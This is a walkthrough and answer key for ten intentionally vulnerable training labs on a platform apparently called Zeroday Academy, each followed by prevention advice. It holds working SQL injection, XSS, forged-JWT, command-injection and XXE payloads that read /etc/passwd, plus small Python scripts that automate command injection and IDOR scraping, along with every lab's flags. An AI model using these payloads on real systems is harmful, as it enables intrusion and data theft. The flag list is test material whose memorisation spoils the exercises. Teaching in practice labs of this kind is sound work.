# Zeroday Academy - Beginner Labs Walkthrough

This document contains detailed exploitation walkthroughs for all 10 beginner labs. Each lab is a standalone vulnerable web application designed for hands-on penetration testing practice using tools like Burp Suite.

---

## Lab 1: SQL Injection - SecureBank Online

**URL:** `/labs/beginner/sqli`
**API Endpoint:** `POST /api/labs/sqli/login`
**Scenario:** A banking portal login form vulnerable to SQL injection

### Exploitation Steps

1. Navigate to the SQL Injection lab
2. Open Burp Suite and configure your browser to use the proxy
3. Attempt to login with any credentials to capture the request
4. Send the request to Repeater

### Basic SQL Injection Bypass

**Payload in username field:**
```
' OR '1'='1
```

**Alternative payloads:**
```
' OR 1=1--
admin'--
' OR ''='
1' OR '1'='1
```

### Admin Access Bypass

**Payload:**
```
admin'--
```

This bypasses authentication and logs in as the admin user.

### Flags
- `FLAG{SQL_INJECTION_AUTH_BYPASS}` - Basic authentication bypass
- `FLAG{SQL_INJECTION_ADMIN_BYPASS}` - Admin-level access with debug info

### Prevention
- Use parameterized queries/prepared statements
- Implement input validation
- Apply least privilege database accounts

---

## Lab 2: Cross-Site Scripting (XSS) - TechBlog

**URL:** `/labs/beginner/xss`
**API Endpoints:**
- `GET /api/labs/xss/comments` - Retrieve comments
- `POST /api/labs/xss/comments` - Add new comment
- `GET /api/labs/xss/search?q=` - Search articles

### Stored XSS Attack

1. Navigate to the blog comments section
2. In Burp Suite, intercept the POST request when submitting a comment
3. Inject JavaScript in the author or content field

**Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

### Reflected XSS Attack

1. Use the search functionality
2. Inject JavaScript in the search query parameter

**Payload:**
```
/api/labs/xss/search?q=<script>alert('XSS')</script>
```

### Flags
- `FLAG{STORED_XSS_INJECTION}` - Stored XSS in comments
- `FLAG{REFLECTED_XSS_SEARCH}` - Reflected XSS in search

### Prevention
- Encode output (HTML entity encoding)
- Use Content-Security-Policy headers
- Validate and sanitize all input

---

## Lab 3: Authentication Bypass - JWT Manipulation

**URL:** `/labs/beginner/auth-bypass`
**API Endpoints:**
- `POST /api/labs/auth/login` - Get JWT token
- `GET /api/labs/auth/admin` - Access admin panel (requires Bearer token)

**Scenario:** Admin panel using JWT authentication with weak implementation

### Exploitation Steps

1. Login with valid credentials: `user:user123` or `guest:guest`
2. You'll receive a JWT token in the response
3. Decode the token (base64) to see the payload
4. Modify the token to gain admin access

### JWT Token Structure
```
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"userId":100,"username":"user","role":"user","isAdmin":false,...}
Signature: [base64 signature]
```

### Attack 1: Algorithm None Bypass
1. Decode the JWT header and payload
2. Change header to: `{"alg":"none","typ":"JWT"}`
3. Change payload role to: `"role":"admin","isAdmin":true`
4. Remove the signature (keep the trailing dot)
5. Send: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwMCwidXNlcm5hbWUiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.`

### Attack 2: Role Tampering with Weak Secret
1. The JWT uses a weak secret that can be brute-forced
2. Common secrets: `secret`, `password`, `123456`, `admin`
3. Re-sign the modified token with the guessed secret

### Flags
- `FLAG{JWT_ALGORITHM_NONE_BYPASS}` - Algorithm confusion attack
- `FLAG{JWT_ROLE_TAMPERING_SUCCESS}` - Role modification with valid signature

### Prevention
- Never accept "none" algorithm
- Use strong, random secrets
- Implement proper role validation server-side

---

## Lab 4: Command Injection - Network Diagnostics

**URL:** `/labs/beginner/cmdi`
**API Endpoint:** `POST /api/labs/cmdi/ping`
**Scenario:** Server administration tool with ping functionality

### Exploitation Steps

1. Navigate to the network diagnostics tool
2. Enter a valid host to see normal behavior
3. Inject commands using shell metacharacters

**Payloads:**
```
127.0.0.1; cat /etc/passwd
127.0.0.1 | ls
127.0.0.1 & whoami
$(cat /etc/passwd)
`id`
```

### Automated Exploitation (Python)
```python
import requests

url = "https://your-site/api/labs/cmdi/ping"
payloads = [
    "127.0.0.1; cat /etc/passwd",
    "127.0.0.1 | ls",
    "127.0.0.1 & id"
]

for payload in payloads:
    r = requests.post(url, json={"host": payload})
    print(r.json())
```

### Flag
- `FLAG{COMMAND_INJECTION_RCE}` - Remote code execution achieved

### Prevention
- Never pass user input directly to system commands
- Use allowlists for valid inputs
- Implement command argument escaping

---

## Lab 5: Sensitive Data Exposure - Healthcare Portal

**URL:** `/labs/beginner/sensitive-data`
**API Endpoints:**
- `GET /api/labs/sensitive/appointments` - List appointments (basic info)
- `GET /api/labs/sensitive/patient/:id` - Get patient basic info
- `GET /api/labs/sensitive/export?format=full` - **HIDDEN** - Export all sensitive data
- `GET /api/labs/sensitive/backup` - **HIDDEN** - Backup configuration with AWS credentials
- `GET /api/labs/sensitive/debug?key=healthcare_debug_2024` - **HIDDEN** - Debug endpoint

**Scenario:** Healthcare portal with hidden endpoints exposing sensitive patient data

### Exploitation Steps

1. Navigate to the healthcare portal - you only see appointments
2. The visible API only shows basic patient info
3. Use Burp Suite to discover hidden endpoints:
   - Try common API paths: `/export`, `/backup`, `/debug`, `/admin`
   - Check for parameter fuzzing: `?format=full`, `?format=csv`

### Hidden Endpoint Discovery

**Export Endpoint:**
```
GET /api/labs/sensitive/export?format=full
```
Returns: All patient data including SSN, medical history, insurance

**Backup Endpoint:**
```
GET /api/labs/sensitive/backup
```
Returns: AWS credentials and backup configuration

**Debug Endpoint:**
```
GET /api/labs/sensitive/debug?key=healthcare_debug_2024
```
Returns: Database credentials and API keys

### Flags
- `FLAG{SENSITIVE_DATA_EXPORT_EXPOSED}` - Single patient export
- `FLAG{BULK_SENSITIVE_DATA_LEAK}` - All patients bulk export
- `FLAG{BACKUP_CREDENTIALS_EXPOSED}` - AWS backup credentials
- `FLAG{DEBUG_ENDPOINT_DISCOVERED}` - Debug endpoint with secrets

### Prevention
- Remove or protect debug/export endpoints
- Implement proper authentication for all endpoints
- Use API gateway with route protection
- Regular security audits for hidden endpoints

---

## Lab 6: XML External Entity (XXE) - Document Importer

**URL:** `/labs/beginner/xxe`
**API Endpoint:** `POST /api/labs/xxe/parse`
**Content-Type:** `application/xml`

### Exploitation Steps

1. Navigate to the XML importer tool
2. Submit a valid XML document first
3. Use Burp Suite to modify the XML with malicious entities

### File Read Attack

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <content>&xxe;</content>
</data>
```

### SSRF Attack

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<data>&xxe;</data>
```

### Flags
- `FLAG{XXE_FILE_READ_PASSWD}` - Reading /etc/passwd
- `FLAG{XXE_FILE_READ_SHADOW}` - Reading /etc/shadow
- `FLAG{XXE_SECRET_FILE_ACCESS}` - Accessing files with "secret" or "flag" in path
- `FLAG{XXE_ARBITRARY_FILE_READ}` - Reading arbitrary files that exist
- `FLAG{XXE_FILE_ACCESS_ATTEMPT}` - Attempting to access files
- `FLAG{XXE_SSRF_ATTACK}` - SSRF via XXE
- `FLAG{XXE_PARAMETER_ENTITY}` - Parameter entity expansion

### Prevention
- Disable external entities in XML parser
- Use less complex data formats (JSON)
- Validate and sanitize XML input

---

## Lab 7: Broken Access Control - HR Portal

**URL:** `/labs/beginner/access-control`
**API Endpoint:** `GET /api/labs/access/users/:id`
**Scenario:** HR system with improper authorization checks

### Exploitation Steps

1. Log in as a regular employee (User ID: 10)
2. View your own profile (normal behavior)
3. Modify the user ID in the URL to access other profiles
4. Access executive profiles with sensitive salary data

**IDOR Attack:**
```
GET /api/labs/access/users/1   (CEO profile)
GET /api/labs/access/users/2   (CFO profile)
GET /api/labs/access/users/3   (HR Director)
```

### Flags
- `FLAG{IDOR_PRIVILEGE_ESCALATION}` - Accessing admin/manager profiles
- `FLAG{IDOR_HORIZONTAL_ACCESS}` - Accessing peer employee profiles

### Prevention
- Implement proper authorization checks
- Use indirect object references
- Validate user permissions for each request

---

## Lab 8: Security Misconfiguration - EcoShop

**URL:** `/labs/beginner/misconfig`
**API Endpoints:**
- `GET /api/labs/misconfig/search?q=` - Product search (verbose errors)
- `GET /api/labs/misconfig/.env` - **HIDDEN** - Environment file
- `GET /api/labs/misconfig/config.json` - **HIDDEN** - Configuration file
- `GET /api/labs/misconfig/admin` - Admin panel with header bypass
- `GET /api/labs/misconfig/server-status` - Server information disclosure

**Scenario:** E-commerce site with multiple security misconfigurations

### Attack 1: Verbose Error Messages

**Payload:**
```
GET /api/labs/misconfig/search?q='
```
Triggers database error with credentials in response.

### Attack 2: Exposed Configuration Files

```
GET /api/labs/misconfig/.env
GET /api/labs/misconfig/config.json
```
Returns full environment variables including:
- Database credentials
- AWS access keys
- Stripe API keys
- JWT secrets

### Attack 3: Debug Header Bypass

```
GET /api/labs/misconfig/admin
Headers: X-Debug-Mode: true
```
OR
```
Headers: X-Admin-Token: ecoshop_admin_2024
```

### Attack 4: Server Information Disclosure

```
GET /api/labs/misconfig/server-status
```
Exposes internal IP, server versions, and system information.

### Flags
- `FLAG{VERBOSE_ERROR_EXPOSURE}` - Error-based credential leak
- `FLAG{ENV_FILE_EXPOSED}` - .env file accessible
- `FLAG{CONFIG_FILE_EXPOSED}` - config.json accessible
- `FLAG{DEBUG_HEADER_ADMIN_BYPASS}` - X-Debug-Mode bypass
- `FLAG{WEAK_ADMIN_TOKEN}` - Weak admin token
- `FLAG{SERVER_INFO_DISCLOSURE}` - Server status exposure

### Prevention
- Disable verbose errors in production
- Block access to configuration files
- Remove debug endpoints/headers
- Use proper authentication for admin routes

---

## Lab 9: API Data Leakage - Developer Portal

**URL:** `/labs/beginner/api-sensitive`
**API Endpoint:** `GET /api/labs/api-leak/profile?debug=true`
**Scenario:** API returning sensitive information in debug mode

### Exploitation Steps

1. Navigate to the developer portal
2. Access the profile API endpoint
3. Add `?debug=true` query parameter
4. Observe exposed secrets in response

**Request:**
```
GET /api/labs/api-leak/profile?debug=true
```

**Exposed data:**
- Password hashes
- Database connection strings
- JWT signing secrets
- Internal API keys

### Flag
- `FLAG{API_DEBUG_MODE_EXPOSURE}` - Accessing debug mode data

### Prevention
- Disable debug endpoints in production
- Use feature flags tied to environment
- Audit API responses for sensitive data
- Implement proper access control

---

## Lab 10: IDOR & Predictable IDs - Order System

**URL:** `/labs/beginner/idor`
**API Endpoints:**
- `GET /api/labs/idor/orders/my` - Your orders
- `GET /api/labs/idor/orders/:id` - Order details

### Exploitation Steps

1. View your own orders (1003, 1004)
2. Note the sequential order ID pattern
3. Access other users' orders by manipulating the ID

**IDOR Attack:**
```
GET /api/labs/idor/orders/1001   (Alice's order)
GET /api/labs/idor/orders/1002   (Bob's order)
```

**Exposed data:**
- Full shipping addresses
- Payment card numbers
- Order details and pricing

### Automation Script
```python
import requests

base_url = "https://your-site/api/labs/idor/orders"

for order_id in range(1001, 1010):
    r = requests.get(f"{base_url}/{order_id}")
    data = r.json()
    if "order" in data:
        print(f"Order {order_id}: {data['order']['shippingAddress']['name']}")
```

### Flag
- `FLAG{IDOR_ORDER_ACCESS}` - Accessing another user's order

### Prevention
- Use UUIDs instead of sequential IDs
- Implement proper authorization checks
- Validate user ownership of resources

---

## Summary

| Lab | Vulnerability | Flag(s) |
|-----|--------------|---------|
| 1 | SQL Injection | `FLAG{SQL_INJECTION_AUTH_BYPASS}`, `FLAG{SQL_INJECTION_ADMIN_BYPASS}` |
| 2 | XSS | `FLAG{STORED_XSS_INJECTION}`, `FLAG{REFLECTED_XSS_SEARCH}` |
| 3 | JWT Auth Bypass | `FLAG{JWT_ALGORITHM_NONE_BYPASS}`, `FLAG{JWT_ROLE_TAMPERING_SUCCESS}` |
| 4 | Command Injection | `FLAG{COMMAND_INJECTION_RCE}` |
| 5 | Sensitive Data | `FLAG{SENSITIVE_DATA_EXPORT_EXPOSED}`, `FLAG{BULK_SENSITIVE_DATA_LEAK}`, `FLAG{BACKUP_CREDENTIALS_EXPOSED}`, `FLAG{DEBUG_ENDPOINT_DISCOVERED}` |
| 6 | XXE | `FLAG{XXE_FILE_READ_PASSWD}`, `FLAG{XXE_FILE_READ_SHADOW}`, `FLAG{XXE_SECRET_FILE_ACCESS}`, `FLAG{XXE_ARBITRARY_FILE_READ}`, `FLAG{XXE_SSRF_ATTACK}`, `FLAG{XXE_PARAMETER_ENTITY}` |
| 7 | Access Control | `FLAG{IDOR_PRIVILEGE_ESCALATION}`, `FLAG{IDOR_HORIZONTAL_ACCESS}` |
| 8 | Misconfiguration | `FLAG{VERBOSE_ERROR_EXPOSURE}`, `FLAG{ENV_FILE_EXPOSED}`, `FLAG{CONFIG_FILE_EXPOSED}`, `FLAG{DEBUG_HEADER_ADMIN_BYPASS}`, `FLAG{WEAK_ADMIN_TOKEN}`, `FLAG{SERVER_INFO_DISCLOSURE}` |
| 9 | API Leakage | `FLAG{API_DEBUG_MODE_EXPOSURE}` |
| 10 | IDOR | `FLAG{IDOR_ORDER_ACCESS}` |

Total: 25+ flags across 10 labs
